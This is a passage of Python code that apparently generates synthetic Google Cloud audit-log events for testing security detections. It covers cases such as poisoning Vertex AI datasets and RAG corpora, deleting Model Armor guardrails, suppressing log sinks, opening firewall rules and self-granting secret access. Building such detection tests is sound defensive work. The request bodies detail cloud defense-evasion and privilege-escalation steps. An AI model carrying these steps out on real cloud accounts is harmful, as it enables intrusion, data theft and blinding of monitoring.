        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.JobService.CreateCustomJob",
        resource_name   = f"projects/{project_id}/locations/{region}/customJobs/{job_name}",
        resource_type   = "aiplatform.googleapis.com/CustomJob",
        resource_labels = {"custom_job_id": job_name, "location": region},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "displayName":     job_name,
            "jobSpec": {
                "workerPoolSpecs": [worker_spec],
            },
        },
    )
    return [entry]


def _gen_vertex_dataset_poison(config, context=None):
    """
    THREAT: Import data into a Vertex AI dataset from a malicious GCS source.
    Analogous to SAGEMAKER_LABEL_MODIFICATION.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    dataset = _get_random_vertex_dataset(config)
    attacker_bucket = f"{random.choice(_ATTACKER_DOMAINS).split('.')[0]}-poison-{random.randint(1000, 9999)}"

    ds_parts    = dataset.split('/')
    dataset_id  = ds_parts[-1]
    dataset_loc = ds_parts[3] if len(ds_parts) > 3 else _random_region(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.DatasetService.ImportData",
        resource_name   = dataset,
        resource_type   = "aiplatform.googleapis.com/Dataset",
        resource_labels = {"dataset_id": dataset_id, "location": dataset_loc},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "name": dataset,
            "importConfigs": [
                {
                    "gcsSource": {
                        "uris": [f"gs://{attacker_bucket}/poisoned-labels/*.jsonl"],
                    },
                    "importSchemaUri": (
                        "gs://google-cloud-aiplatform/schema/dataset/ioformat/"
                        "jsonl_io_format_1.0.0.yaml"
                    ),
                }
            ],
        },
    )
    return [entry]


def _gen_vertex_rag_corpus_modify(config, context=None):
    """
    THREAT: Import attacker-controlled files into a Vertex AI RAG corpus.
    Analogous to BEDROCK_RAG_KB_MODIFICATION.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    corpus_id = ''.join(random.choices('0123456789', k=12))
    attacker_bucket = f"{random.choice(_ATTACKER_DOMAINS).split('.')[0]}-rag-{random.randint(1000, 9999)}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.VertexRagDataService.ImportRagFiles",
        resource_name   = f"projects/{project_id}/locations/{region}/ragCorpora/{corpus_id}",
        resource_type   = "audited_resource",
        resource_labels = {"service": "aiplatform.googleapis.com", "method": "google.cloud.aiplatform.v1.VertexRagDataService.ImportRagFiles"},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "parent": f"projects/{project_id}/locations/{region}/ragCorpora/{corpus_id}",
            "importRagFilesConfig": {
                "gcsSource": {
                    "uris": [f"gs://{attacker_bucket}/rag-inject/*.txt"],
                }
            },
        },
    )
    return [entry]


def _gen_vertex_tor_predict(config, context=None):
    """
    THREAT: Vertex AI prediction from a Tor exit node IP.
    Analogous to BEDROCK_TOR_USAGE.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    endpoint = _get_random_vertex_endpoint(config)
    tor_ip = _get_tor_ip(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = tor_ip,
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.PredictionService.Predict",
        resource_name   = endpoint,
        resource_type   = "aiplatform.googleapis.com/Endpoint",
        resource_labels = {"endpoint_id": endpoint.split('/')[-1], "location": endpoint.split('/')[3] if len(endpoint.split('/')) > 3 else "us-central1"},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {
            "instances":  [{"content": "Recon query from anonymized connection"}],
            "parameters": {"temperature": 0.9, "maxOutputTokens": 1024},
        },
    )
    return [entry]


def _gen_vertex_model_armor_delete(config, context=None):
    """
    THREAT: Delete a Model Armor safety template (modelarmor.googleapis.com).
    Defense Evasion — removes content-safety guardrails on AI workloads.
    Analogous to BEDROCK_GUARDRAIL_DELETED.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    template = _get_model_armor_template(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "modelarmor.googleapis.com",
        method_name     = "google.cloud.modelarmor.v1.ModelArmor.DeleteTemplate",
        resource_name   = template,
        resource_type   = "audited_resource",
        resource_labels = {"service": "modelarmor.googleapis.com", "method": "google.cloud.modelarmor.v1.ModelArmor.DeleteTemplate"},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"name": template},
    )
    return [entry]


def _gen_vertex_disable_model_logging(config, context=None):
    """
    THREAT: Update a Vertex AI model to disable explanation/logging spec.
    Defense Evasion — analogous to BEDROCK_DELETE_LOGGING.
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    model = _get_random_vertex_model(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "aiplatform.googleapis.com",
        method_name     = "google.cloud.aiplatform.v1.ModelService.UpdateModel",
        resource_name   = model,
        resource_type   = "aiplatform.googleapis.com/Model",
        resource_labels = {"model_id": model.split('/')[-1], "location": model.split('/')[3] if len(model.split('/')) > 3 else "us-central1"},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "model": {
                "name":            model,
                "explanationSpec": None,
            },
            "updateMask": "explanationSpec",
        },
    )
    return [entry]


# ---------------------------------------------------------------------------
# Additional Generators — Documentation-verified event types
# ---------------------------------------------------------------------------

def _gen_vpn_route_create(config, context=None):
    """
    THREAT: Create a Compute Engine VPC route with a suspicious destination
    (e.g. 0.0.0.0/0 via external next-hop) — default-route hijacking.
    resource_type: gce_route  labels: route_id (numeric)
    method: v1.compute.routes.insert  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    network = _get_random_vpc_network(config)
    route_name = f"suspicious-route-{uuid.uuid4().hex[:8]}"
    route_id = str(random.randint(100000000000000000, 999999999999999999))
    dest_range = random.choice(["0.0.0.0/0", "10.0.0.0/8", "172.16.0.0/12"])
    next_hop_ip = _random_external_ip()

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.routes.insert",
        resource_name   = f"projects/{project_id}/global/routes/{route_name}",
        resource_type   = "gce_route",
        resource_labels = {"route_id": route_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project": project_id,
            "route": {
                "name":       route_name,
                "network":    f"projects/{project_id}/global/networks/{network}",
                "destRange":  dest_range,
                "nextHopIp":  next_hop_ip,
                "priority":   100,
                "description": "auto-generated route",
            },
        },
    )
    return [entry]


def _gen_create_service_account(config, context=None):
    """
    SUSPICIOUS: Create a new GCP service account.
    Credential staging — first step before CreateServiceAccountKey.
    service: iam.googleapis.com  method: google.iam.admin.v1.CreateServiceAccount
    resource_type: service_account  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    account_id = f"svc-{uuid.uuid4().hex[:10]}"
    sa_email = f"{account_id}@{project_id}.iam.gserviceaccount.com"
    unique_id = str(random.randint(100000000000, 999999999999))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.admin.v1.CreateServiceAccount",
        resource_name   = f"projects/{project_id}/serviceAccounts/{sa_email}",
        resource_type   = "service_account",
        resource_labels = {"email_id": sa_email, "unique_id": unique_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "name":      f"projects/{project_id}",
            "accountId": account_id,
            "serviceAccount": {
                "displayName": f"Service account {account_id}",
                "description": "Programmatically created service account",
            },
        },
        response_body = {
            "name":           f"projects/{project_id}/serviceAccounts/{sa_email}",
            "projectId":      project_id,
            "uniqueId":       unique_id,
            "email":          sa_email,
            "displayName":    f"Service account {account_id}",
            "oauth2ClientId": str(random.randint(100000000000000000, 999999999999999999)),
        },
    )
    return [entry]


def _gen_pubsub_subscription_delete(config, context=None):
    """
    THREAT: Delete a Pub/Sub subscription — disrupts log export / SIEM ingestion.
    service: pubsub.googleapis.com  method: google.pubsub.v1.Subscriber.DeleteSubscription
    resource_type: pubsub_subscription  labels: subscription_id  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sub_resource = _get_random_pubsub_subscription(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "pubsub.googleapis.com",
        method_name     = "google.pubsub.v1.Subscriber.DeleteSubscription",
        resource_name   = sub_resource,
        resource_type   = "audited_resource",
        resource_labels = {"service": "pubsub.googleapis.com", "method": "google.pubsub.v1.Subscriber.DeleteSubscription"},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"subscription": sub_resource},
    )
    return [entry]


def _gen_pubsub_topic_delete(config, context=None):
    """
    THREAT: Delete a Pub/Sub topic — destroys the message bus, disrupts downstream services.
    service: pubsub.googleapis.com  method: google.pubsub.v1.Publisher.DeleteTopic
    resource_type: pubsub_topic  labels: topic_id  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    topic_resource = _get_random_pubsub_topic(config)
    topic_name = topic_resource.split("/")[-1]

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "pubsub.googleapis.com",
        method_name     = "google.pubsub.v1.Publisher.DeleteTopic",
        resource_name   = topic_resource,
        resource_type   = "pubsub_topic",
        resource_labels = {"topic_id": topic_name},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"topic": topic_resource},
    )
    return [entry]


def _gen_sa_impersonation_failed(config, context=None):
    """
    THREAT: Failed service account impersonation attempt — GenerateAccessToken
    returns PERMISSION_DENIED (status_code=7).  The caller lacked
    iam.serviceAccounts.getAccessToken on the target SA.
    Caller and target SA are always distinct identities.
    resource_type: service_account  log_type: ACTIVITY  severity: ERROR
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)

    # Ensure target SA is always a different identity from the caller
    gcp_conf = config.get(CONFIG_KEY, {})
    all_sas  = gcp_conf.get('service_accounts', [])
    candidates = [sa for sa in all_sas if sa != p['email']]
    if candidates:
        target_sa = random.choice(candidates)
    else:
        target_sa = f"privileged-sa@{project_id}.iam.gserviceaccount.com"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iamcredentials.googleapis.com",
        method_name     = "google.iam.credentials.v1.IAMCredentials.GenerateAccessToken",
        resource_name   = f"projects/-/serviceAccounts/{target_sa}",
        resource_type   = "service_account",
        resource_labels = {"email_id": target_sa,
                           "unique_id": str(random.randint(100000000000, 999999999999))},
        log_type        = _LOG_DATA_ACCESS,
        status_code     = _STATUS_CODE_PERMISSION_DENIED,
        status_message  = (
            f"Permission 'iam.serviceAccounts.getAccessToken' denied on resource "
            f"'projects/-/serviceAccounts/{target_sa}' (or it may not exist)."
        ),
        authorization_info = [
            {
                "resource":   f"projects/-/serviceAccounts/{target_sa}",
                "permission": "iam.serviceAccounts.getAccessToken",
                "granted":    False,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "name":     f"projects/-/serviceAccounts/{target_sa}",
            "scope":    ["https://www.googleapis.com/auth/cloud-platform"],
            "lifetime": "3600s",
        },
    )
    return [entry]


def _gen_admin_role_granted(config, context=None):
    """
    THREAT: Grant a highly privileged admin role to a Cloud Identity user or group.
    Covers roles/resourcemanager.organizationAdmin, roles/iam.securityAdmin, etc.
    Distinct from IAM_PRIVILEGE_ESCALATION (which targets service accounts).
    service: cloudresourcemanager.googleapis.com  method: SetIamPolicy
    resource_type: project  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    domain = _get_corp_domain(config)
    role = random.choice(_ADMIN_ROLES)

    # 50% user identity, 50% group identity
    if random.random() < 0.5:
        username = random.choice(["it.admin", "cloud.admin", "devops.lead", "sec.engineer"])
        member = f"user:{username}@{domain}"
    else:
        group = random.choice(_CORP_GROUP_PREFIXES)
        member = f"group:{group}@{domain}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [{"role": role, "members": [member]}],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": role, "member": member},
                ],
            },
        },
    )
    return [entry]


def _gen_logging_sink_delete(config, context=None):
    """
    THREAT: Delete a Cloud Logging export sink — standalone scenario key.
    Silences SIEM by removing the log export path.
    service: logging.googleapis.com  method: ConfigServiceV2.DeleteSink
    resource_type: logging_sink  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sink_name = _get_random_log_sink(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "logging.googleapis.com",
        method_name     = "google.logging.v2.ConfigServiceV2.DeleteSink",
        resource_name   = f"projects/{project_id}/sinks/{sink_name}",
        resource_type   = "project",
        resource_labels = {"project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"sinkName": f"projects/{project_id}/sinks/{sink_name}"},
    )
    return [entry]


def _gen_logging_sink_modify(config, context=None):
    """
    THREAT: Modify a Cloud Logging export sink to suppress audit log export.
    Updates the sink filter to exclude cloudaudit logs or sets it disabled.
    service: logging.googleapis.com  method: ConfigServiceV2.UpdateSink
    resource_type: logging_sink  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    sink_name = _get_random_log_sink(config)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "logging.googleapis.com",
        method_name     = "google.logging.v2.ConfigServiceV2.UpdateSink",
        resource_name   = f"projects/{project_id}/sinks/{sink_name}",
        resource_type   = "project",
        resource_labels = {"project_id": project_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "sinkName":   f"projects/{project_id}/sinks/{sink_name}",
            "updateMask": "filter,disabled",
            "sink": {
                "name":    sink_name,
                "filter":  'logName!~"cloudaudit.googleapis.com"',
                "disabled": True,
            },
        },
    )
    return [entry]


def _gen_firewall_rule_modify(config, context=None):
    """
    THREAT: Patch an existing VPC firewall rule to weaken security controls.

    Fires XSIAM 'GCP Firewall Rule Modification' detector.
    Detection logic (Elastic/XSIAM): event.action matches *.compute.firewalls.patch
    MITRE: T1562 Impair Defenses / TA0005 Defense Evasion

    Distinct from:
      - firewalls.insert  -> 'GCP Firewall Rule Creation'
      - firewalls.delete  -> 'GCP Firewall Rule Deletion'
      - firewalls.patch   -> 'GCP Firewall Rule Modification' <- this generator

    Three realistic patch variants:
      1. Expand sourceRanges to 0.0.0.0/0 (open existing rule to internet)
      2. Add sensitive ports (22/SSH, 3389/RDP, 3306/MySQL, 5432/PG, 1433/MSSQL)
      3. Lower priority (attacker makes permissive rule override deny rules)
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    rule_name  = _get_random_firewall_rule(config)
    firewall_rule_id = str(random.randint(100000000000000000, 999999999999999999))

    variant = random.choice(["open_sources", "add_ports", "lower_priority"])

    if variant == "open_sources":
        # Most suspicious: open an existing rule to the whole internet
        patched = {
            "sourceRanges": ["0.0.0.0/0"],
            "allowed":      [{"IPProtocol": "tcp", "ports": ["80", "443", "22", "3389"]}],
            "direction":    "INGRESS",
            "disabled":     False,
        }
    elif variant == "add_ports":
        # Add high-value lateral-movement or exfil ports to an existing rule
        sensitive_ports = random.sample(["22", "3389", "3306", "5432", "1433", "6379", "27017"], k=random.randint(2, 4))
        patched = {
            "allowed": [{"IPProtocol": "tcp", "ports": sensitive_ports}],
            "sourceRanges": ["10.0.0.0/8", "0.0.0.0/0"],
        }
    else:
        # Lower the priority so this permissive rule fires before deny rules
        patched = {
            "priority": random.randint(50, 200),
            "allowed":  [{"IPProtocol": "all"}],
            "sourceRanges": ["0.0.0.0/0"],
        }

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.firewalls.patch",
        resource_name   = f"projects/{project_id}/global/firewalls/{rule_name}",
        resource_type   = "gce_firewall_rule",
        resource_labels = {"firewall_rule_id": firewall_rule_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {
            "project":          project_id,
            "firewall":         rule_name,
            "firewallResource": patched,
        },
    )
    return [entry]


def _gen_firewall_rule_delete(config, context=None):
    """
    THREAT: Delete a VPC firewall rule — removes network perimeter protection.
    Defense Evasion.
    service: compute.googleapis.com  method: v1.compute.firewalls.delete
    resource_type: gce_firewall_rule  labels: firewall_rule_id  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    rule_name = _get_random_firewall_rule(config)
    firewall_rule_id = str(random.randint(100000000000000000, 999999999999999999))

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.firewalls.delete",
        resource_name   = f"projects/{project_id}/global/firewalls/{rule_name}",
        resource_type   = "gce_firewall_rule",
        resource_labels = {"firewall_rule_id": firewall_rule_id},
        log_type        = _LOG_ACTIVITY,
        request_body    = {"project": project_id, "firewall": rule_name},
    )
    return [entry]


def _gen_cli_from_serverless(config, context=None):
    """
    THREAT: A GCP API call made from within a Cloud Function / Cloud Run service
    using the gcloud CLI.  The signal is:
      callerSuppliedUserAgent contains 'command/gcloud'  AND
      callerIp is a GCP-internal / RFC-1918 address  AND
      principalEmail is a service account.
    Suspicious because legitimate serverless code uses client libraries, not gcloud.
    """
    project_id = _get_project_id(config)
    # Must use a serverless-domain SA (developer.gserviceaccount.com,
    # appspot.gserviceaccount.com, or cloudbuild.gserviceaccount.com) so
    # XSIAM can identify this as a serverless compute service token.
    sa_email = _get_serverless_sa(config)
    internal_ip = _get_serverless_internal_ip()
    invocation_id = uuid.uuid4().hex[:8]

    # The downstream API call the function made — mix of read (DATA_ACCESS) and write (ACTIVITY)
    api_choice = random.choice([
        "iam_list", "storage_list", "secret_access",
        "iam_create_key", "storage_delete",
    ])
    if api_choice == "iam_list":
        service  = "iam.googleapis.com"
        method   = "google.iam.admin.v1.ListServiceAccounts"
        res_name = f"projects/{project_id}"
        res_type = "project"
        res_lbl  = {"project_id": project_id}
        log_t    = _LOG_DATA_ACCESS
        req_body = {"name": f"projects/{project_id}"}
        gcloud_cmd = "gcloud.iam.service-accounts.list"
    elif api_choice == "storage_list":
        bucket   = _get_random_gcs_bucket(config)
        service  = "storage.googleapis.com"
        method   = "storage.objects.list"
        res_name = f"projects/_/buckets/{bucket}"
        res_type = "gcs_bucket"
        res_lbl  = {"bucket_name": bucket, "project_id": project_id}
        log_t    = _LOG_DATA_ACCESS
        req_body = {"bucket": bucket}
        gcloud_cmd = "gcloud.storage.ls"
    elif api_choice == "secret_access":
        secret_id = _get_random_secret_id(config, sensitive=True)
        service  = "secretmanager.googleapis.com"
        method   = "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion"
        res_name = f"{secret_id}/versions/latest"
        res_type = "audited_resource"
        res_lbl  = {"service": "secretmanager.googleapis.com", "project_id": project_id}
        log_t    = _LOG_DATA_ACCESS
        req_body = {"name": f"{secret_id}/versions/latest"}
        gcloud_cmd = "gcloud.secrets.versions.access"
    elif api_choice == "iam_create_key":
        # ACTIVITY: serverless code creating a SA key — credential exfil signal
        sa_target = _get_random_sa_excluding(config, sa_email)
        service  = "iam.googleapis.com"
        method   = "google.iam.admin.v1.CreateServiceAccountKey"
        res_name = f"projects/{project_id}/serviceAccounts/{sa_target}"
        res_type = "service_account"
        res_lbl  = {"email_id": sa_target, "project_id": project_id,
                    "unique_id": str(random.randint(100000000000, 999999999999))}
        log_t    = _LOG_ACTIVITY
        req_body = {"name": f"projects/{project_id}/serviceAccounts/{sa_target}",
                    "keyAlgorithm": "KEY_ALG_RSA_2048", "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE"}
        gcloud_cmd = "gcloud.iam.service-accounts.keys.create"
    else:
        # ACTIVITY: serverless code deleting a GCS object — tampering/cover-tracks signal
        bucket   = _get_random_gcs_bucket(config)
        obj_name = f"logs/{uuid.uuid4().hex[:8]}.json"
        service  = "storage.googleapis.com"
        method   = "storage.objects.delete"
        res_name = f"projects/_/buckets/{bucket}/objects/{obj_name}"
        res_type = "gcs_bucket"
        res_lbl  = {"bucket_name": bucket, "project_id": project_id}
        log_t    = _LOG_ACTIVITY
        req_body = {"bucket": bucket, "object": obj_name}
        gcloud_cmd = "gcloud.storage.rm"

    # Real gcloud CLI user-agent format: includes specific command invoked
    sdk_version = random.choice(["455.0.0", "458.0.1", "461.0.0", "463.0.0"])
    gcloud_ua = (
        f"google-cloud-sdk/{sdk_version} command/{gcloud_cmd} "
        f"invocation-id/{invocation_id} environment/GCE "
        f"environment-version/None interactive/False from-script/True"
    )

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = sa_email,
        caller_ip       = internal_ip,
        service_name    = service,
        method_name     = method,
        resource_name   = res_name,
        resource_type   = res_type,
        resource_labels = res_lbl,
        log_type        = log_t,
        user_agent      = gcloud_ua,
        request_body    = req_body,
    )
    return [entry]


def _gen_functions_sensitive_role(config, context=None):
    """
    THREAT: Grant a sensitive Cloud Functions / Cloud Run role on a specific function.
    Resource-level (function) SetIamPolicy — distinct from project-level IAM grants.
    service: cloudfunctions.googleapis.com
    method: google.cloud.functions.v2.FunctionService.SetIamPolicy
    resource_type: cloud_function  labels: function_name, region  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    fn_name = _get_random_cloud_function(config)
    role = random.choice(_FUNCTIONS_SENSITIVE_ROLES)

    # Member can be a service account or an external user
    if random.random() < 0.6:
        member = f"serviceAccount:{_get_random_sa(config)}"
    else:
        domain = _get_corp_domain(config)
        member = f"user:external.dev@{domain}"

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudfunctions.googleapis.com",
        method_name     = "google.cloud.functions.v2.FunctionService.SetIamPolicy",
        resource_name   = f"projects/{project_id}/locations/{region}/functions/{fn_name}",
        resource_type   = "cloud_function",
        resource_labels = {"function_name": fn_name, "region": region},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}/locations/{region}/functions/{fn_name}",
                "permission": "cloudfunctions.functions.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "policy": {
                "bindings": [{"role": role, "members": [member]}],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": role, "member": member},
                ],
            },
        },
    )
    return [entry]


def _gen_sensitive_role_to_group(config, context=None):
    """
    THREAT: Grant a highly privileged role to a group: principal at project level.
    Privilege Escalation — bulk access grant via group membership.
    service: cloudresourcemanager.googleapis.com  method: SetIamPolicy
    resource_type: project  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    domain = _get_corp_domain(config)
    group_prefix = random.choice(_CORP_GROUP_PREFIXES)
    member = f"group:{group_prefix}@{domain}"
    role = random.choice([
        # IAM / resource manager
        "roles/owner", "roles/editor",
        "roles/iam.securityAdmin", "roles/resourcemanager.organizationAdmin",
        # Storage — triggers "GCP sensitive storage role granted"
        "roles/storage.admin", "roles/storage.objectAdmin",
        # Compute — triggers "GCP sensitive compute role granted"
        "roles/compute.admin", "roles/compute.instanceAdmin.v1",
        "roles/compute.networkAdmin", "roles/compute.securityAdmin",
        # Other services
        "roles/deploymentmanager.editor", "roles/secretmanager.admin",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [{"role": role, "members": [member]}],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
                    {"action": "ADD", "role": role, "member": member},
                ],
            },
        },
    )
    return [entry]


def _gen_iam_deny_policy_create(config, context=None):
    """
    THREAT: Create an IAM deny policy (google.iam.v2.Policies.CreatePolicy).
    Can be used to lock out legitimate admins by denying critical IAM permissions.
    IAM deny is a separate v2 API — resource name uses URL-encoded attachment path.
    service: iam.googleapis.com  method: google.iam.v2.Policies.CreatePolicy
    resource_type: project  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    # IAM deny policies attach to the resource hierarchy node; project number != project ID
    project_number = str(random.randint(100000000000, 999999999999))
    policy_id = f"deny-{uuid.uuid4().hex[:8]}"
    # The resource name embeds the attachment point URL-encoded
    attachment = f"cloudresourcemanager.googleapis.com%2Fprojects%2F{project_number}"
    resource_name = f"policies/{attachment}/denypolicies/{policy_id}"

    denied_permissions = random.choice([
        ["iam.googleapis.com/roles.delete",
         "iam.googleapis.com/serviceAccounts.setIamPolicy"],
        ["resourcemanager.googleapis.com/projects.setIamPolicy",
         "iam.googleapis.com/roles.create"],
        ["logging.googleapis.com/sinks.delete",
         "iam.googleapis.com/serviceAccountKeys.create"],
    ])

    # Target specific admins/SAs — attacker locks out the security team or on-call rotation.
    # Uses standard IAM member notation (serviceAccount:/user:) not principalSet:// URIs.
    target_sa   = _get_random_sa(config)
    denied_principals = [f"serviceAccount:{target_sa}"]
    # 40% also add a human user so it looks like locking out both SA and human admin
    if random.random() < 0.4:
        users = config.get('session_context', {}).get('users', [])
        user_emails = [u['email'] for u in users if not u['email'].endswith('.iam.gserviceaccount.com')]
        if user_emails:
            denied_principals.append(f"user:{random.choice(user_emails)}")

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "iam.googleapis.com",
        method_name     = "google.iam.v2.Policies.CreatePolicy",
        resource_name   = resource_name,
        resource_type   = "audited_resource",
        resource_labels = {"service": "iam.googleapis.com", "method": "google.iam.v2.Policies.CreatePolicy"},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [{
            "resource":   resource_name,
            "permission": "iam.denypolicies.create",
            "granted":    True,
            "resourceAttributes": {},
        }],
        request_body    = {
            "parent":   f"policies/{attachment}",
            "policyId": policy_id,
            "policy": {
                "displayName": "Deny sensitive IAM operations",
                "rules": [
                    {
                        "denyRule": {
                            "deniedPrincipals":  denied_principals,
                            "deniedPermissions": denied_permissions,
                            # Attacker adds themselves as an exception so they retain access
                            "exceptionPrincipals": [
                                f"serviceAccount:{p['email']}" if p['is_service_account']
                                else f"user:{p['email']}"
                            ],
                        }
                    }
                ],
            },
        },
    )
    return [entry]


def _gen_secretmanager_self_grant(config, context=None):
    """
    THREAT: A cloud identity grants itself a sensitive Secret Manager IAM role.
    Self-grant pattern: principalEmail == member — the caller and grantee are the same identity.
    Triggers XSIAM: 'A cloud identity granted itself a sensitive Secret Manager IAM role'.
    Persistence / Credential Access — attacker with SetIamPolicy rights escalates to secret reader.
    service: cloudresourcemanager.googleapis.com  method: SetIamPolicy
    resource_type: project  log_type: ACTIVITY
    """
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    email = p['email']
    # Self-grant: caller adds themselves as the grantee
    member_prefix = "serviceAccount" if p['is_service_account'] else "user"
    member = f"{member_prefix}:{email}"
    role = random.choice([
        "roles/secretmanager.secretAccessor",    # read all secret values
        "roles/secretmanager.admin",             # full control
        "roles/secretmanager.secretVersionManager",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = email,
        caller_ip       = p['caller_ip'],
        service_name    = "cloudresourcemanager.googleapis.com",
        method_name     = "SetIamPolicy",
        resource_name   = f"projects/{project_id}",
        resource_type   = "project",
        resource_labels = {},
        log_type        = _LOG_ACTIVITY,
        authorization_info = [
            {
                "resource":   f"projects/{project_id}",
                "permission": "resourcemanager.projects.setIamPolicy",
                "granted":    True,
                "resourceAttributes": {},
            }
        ],
        request_body = {
            "resource": f"projects/{project_id}",
            "policy": {
                "bindings": [{"role": role, "members": [member]}],
                "version": 1,
            },
        },
        service_data = {
            "@type": "type.googleapis.com/google.iam.v1.logging.AuditData",
            "policyDelta": {
                "bindingDeltas": [
